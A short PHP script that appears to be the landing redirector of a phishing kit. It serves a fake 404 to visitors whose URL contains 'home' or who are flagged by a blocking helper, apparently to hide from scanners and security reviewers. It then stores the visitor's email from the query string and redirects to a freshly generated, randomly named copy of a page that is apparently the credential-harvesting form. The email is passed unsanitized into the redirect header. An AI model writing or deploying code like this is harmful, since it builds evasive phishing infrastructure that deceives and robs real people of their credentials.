<?php
include_once("helper.php");

if (strstr(strtolower($_SERVER['REQUEST_URI']), 'home') || isToBlock()) {
    header("HTTP/1.0 404 Not Found");
    die();
}

session_start();

$email = $_GET['email'];
$_SESSION['email'] = $email;
$secfile = createHashedPage("inde.php");

if ($secfile) {
    header("Location: $secfile?email=$email");
}

?>
